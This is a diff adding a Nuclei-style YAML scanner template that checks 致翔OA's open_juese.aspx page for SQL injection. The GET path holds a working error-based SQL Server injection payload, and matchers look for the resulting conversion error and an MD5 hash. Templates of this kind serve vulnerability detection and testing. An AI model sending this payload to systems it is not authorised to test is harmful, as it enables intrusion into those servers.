@@ -1,0 +1,35 @@
+id: poc-yaml-zxoa-open-juese-sqli
+info:
+  name: 致翔OA open_juese SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 致翔OA open_juese detected by leveraging MD5 hash collision.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+&requeststr="
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+        part: body
+      - type: word
+        words:
+          - "转换成数据类型 int 时失败"
+        part: body
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
